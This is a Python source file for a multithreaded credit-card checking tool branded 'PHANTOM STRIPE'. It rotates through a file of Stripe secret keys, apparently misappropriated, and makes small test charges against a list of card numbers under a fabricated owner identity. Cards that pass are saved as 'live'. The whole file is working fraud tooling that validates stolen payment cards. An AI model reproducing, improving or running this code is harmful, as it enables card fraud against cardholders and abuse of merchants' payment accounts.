import os, requests, win32crypt, easygui, time, random, threading, ctypes
from colorama import Fore

def center(var:str, space:int=None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines())/2)])) / 2
    
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

class PHANTOM:
    def __init__(self):
        self.cardlist = []
        self.lives = 0
        self.dead = 0
        self.cpm = 0  
        self.retries = 0   
        self.lock = threading.Lock()
            
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'[PHANTOM STRIPE v1.9]  Made By uNique') 
        text = '''
        ██████╗░██╗░░██╗░█████╗░███╗░░██╗████████╗░█████╗░███╗░░░███╗  ░██████╗████████╗██████╗░██╗██████╗░███████╗
        ██╔══██╗██║░░██║██╔══██╗████╗░██║╚══██╔══╝██╔══██╗████╗░████║  ██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██╔════╝
        ██████╔╝███████║███████║██╔██╗██║░░░██║░░░██║░░██║██╔████╔██║  ╚█████╗░░░░██║░░░██████╔╝██║██████╔╝█████╗░░
        ██╔═══╝░██╔══██║██╔══██║██║╚████║░░░██║░░░██║░░██║██║╚██╔╝██║  ░╚═══██╗░░░██║░░░██╔══██╗██║██╔═══╝░██╔══╝░░
        ██║░░░░░██║░░██║██║░░██║██║░╚███║░░░██║░░░╚█████╔╝██║░╚═╝░██║  ██████╔╝░░░██║░░░██║░░██║██║██║░░░░░███████╗
        ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝  ╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░░░░╚══════╝'''        
        faded = ''
        red = 40
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))
        print(center(f'{Fore.LIGHTYELLOW_EX}\nTELEGRAM: https://t.me/username_uNique\n{Fore.RESET}'))
    
    def countCPM(self):
        while True:
            old = self.lives
            time.sleep(20)
            new = self.lives
            self.cpm = (new-old) * 15

    def editCounter(self):
        while True:
            elapsed = time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start))
            ctypes.windll.kernel32.SetConsoleTitleW(f'[PHANTOM STRIPE v1.9]     LIVE: {self.lives}     DEAD: {self.dead}     RETRIES: {self.retries}     CPM: {self.cpm}     THREADS: {threading.active_count() - 2}     TIME: {elapsed}')
            time.sleep(0.4)

    def getCardList(self):
        try:
            print(f'[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Select CardList: ')
            path = easygui.fileopenbox(default='*.txt', filetypes = ['*.txt'], title= '[PHANTOM STRIPE v1.9]  Select CardList', multiple= False)
            with open(path, 'r', encoding="utf-8") as f:
                for l in f:
                     self.cardlist.append(l.replace('\n', ''))
        except:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to open CardList')
            os.system('pause >nul')
            quit()
    
    def getBetwn(self, message, first, last):
        try:
            start = message.index( first ) + len( first )
            end = message.index( last, start )
            return message[start:end]
        except ValueError:
            return ""

    def SK_KEY(self):
        with open("KEY.txt", "r") as file:
            allText = file.read()
            lines = list(map(str, allText.split()))
            return random.choice(lines)

    def checker(self, card, month, year, cvv):
        try:
            client = requests.Session()
            wcard = f'{card}|{month}|{year}|{cvv}'
            secret_key = self.SK_KEY()
            rand = random.randint(100, 999)


            headers = {"Authorization": f"Bearer {secret_key}", "content-type": "application/x-www-form-urlencoded"}
            data = f'type=card&amount=100&currency=usd&flow=none&usage=reusable&statement_descriptor=reusable payment source.&owner[name]=Jonas+Kyle&owner[address][line1]=75 new street&owner[address][state]=New York&owner[address][city]=New York&owner[address][postal_code]=10004&owner[address][country]=US&owner[email]=jonasjonas77x7{rand}@gmail.com&owner[verified_email]=jonasjonas77x7{rand}@gmail.com&owner[phone]=3152273{rand}&card[number]={card}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}'
            resp = client.post("https://api.stripe.com/v1/sources", headers=headers, data=data)
            source_id = self.getBetwn(resp.text, '"id": "','"')


            if 'rate_limit' in resp.text:
                self.lock.acquire()
                self.retries += 1
                self.lock.release()

            elif 'api_key_expired' in resp.text:
                self.lock.acquire()
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} {wcard} | {secret_key} EXPIRED KEY')
                self.retries += 1
                self.lock.release()

            elif 'testmode_charges_only' in resp.text:
                self.lock.acquire()
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} {wcard} | {secret_key} TESTMODE KEY')
                self.retries += 1
                self.lock.release()

            elif '"error"' in resp.text:
                self.lock.acquire()
                decline_code = self.getBetwn(resp.text, '"decline_code": "','"')
                if not decline_code:
                    decline_code = self.getBetwn(resp.text, '"code": "','"')
                    if not decline_code:
                        decline_code = self.getBetwn(resp.text, '"message": "','"')
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}DEADS{Fore.RESET} {wcard} {decline_code}')
                self.dead += 1
                self.cpm += 1
                self.lock.release()
            
            
            headers = {"Authorization": f"Bearer {secret_key}", "content-type": "application/x-www-form-urlencoded"}
            data = f'amount=100&currency=usd&source={source_id}'
            resp = client.post("https://api.stripe.com/v1/charges", headers=headers, data=data)

            if '"cvc_check": "pass"' in resp.text:
                self.lock.acquire()
                print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}LIVES{Fore.RESET} {wcard} | APPROVED_BY_NETWORK')
                self.lives += 1
                self.cpm += 1
                with open('lives.txt', 'a', encoding='utf-8') as fp:
                    fp.writelines(f'{wcard}\n')
                self.lock.release()
                
            elif 'approved_by_network' in resp.text:
                self.lock.acquire()
                print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] {Fore.LIGHTBLUE_EX}LIVES{Fore.RESET} {wcard} | APPROVED_BY_NETWORK')
                self.lives += 1
                self.cpm += 1
                with open('lives.txt', 'a', encoding='utf-8') as fp:
                    fp.writelines(f'{wcard}\n')
                self.lock.release()

            elif 'must be a dictionary or a non-empty string' in resp.text:
                self.lock.acquire()
                self.retries += 1
                self.lock.release()

            elif 'rate_limit' in resp.text:
                self.lock.acquire()
                self.retries += 1
                self.lock.release()

            elif '"error"' in resp.text:
                self.lock.acquire()
                decline_code = self.getBetwn(resp.text, '"decline_code": "','"')
                if not decline_code:
                    decline_code = self.getBetwn(resp.text, '"code": "','"')
                    if not decline_code:
                        decline_code = self.getBetwn(resp.text, '"message": "','"')
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}DEADS{Fore.RESET} {wcard} {decline_code}')
                self.dead += 1
                self.cpm += 1
                self.lock.release()
            
            else:
                self.lock.acquire()
                print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}DEADS{Fore.RESET} {wcard} EMPTY RESPONSE')
                self.dead += 1
                self.lock.release()

        except:
            self.lock.acquire()
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Connection Timeout.')
            self.retries += 1
            self.lock.release()
    
    def worker(self, cardlist, thread_id):
        while self.check[thread_id] < len(cardlist):
            combination = cardlist[self.check[thread_id]].split('|')
            self.checker(combination[0], combination[1], combination[2], combination[3])
            self.check[thread_id] += 1 

    def main(self):
        self.ui()
        try:
            self.threadcount = int(input(f'[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads: '))
        except ValueError:
            print(f'[{Fore.LIGHTRED_EX}!{Fore.RESET}] Value must be Numeric')
            os.system('pause >nul')
            quit()
               
        self.ui()
        self.getCardList()
        self.start = time.time()
        threading.Thread(target=self.countCPM, daemon=True).start()
        threading.Thread(target=self.editCounter ,daemon=True).start()
        
        threads = []
        self.check = [0 for i in range(self.threadcount)]
        for i in range(self.threadcount):
            sliced_cardlist = self.cardlist[int(len(self.cardlist) / self.threadcount * i): int(len(self.cardlist)/ self.threadcount* (i+1))]
            t = threading.Thread(target=self.worker, args=(sliced_cardlist, i,) )
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] TASK COMPLETE.')
        os.system('pause>nul')
        
n = PHANTOM()
n.main()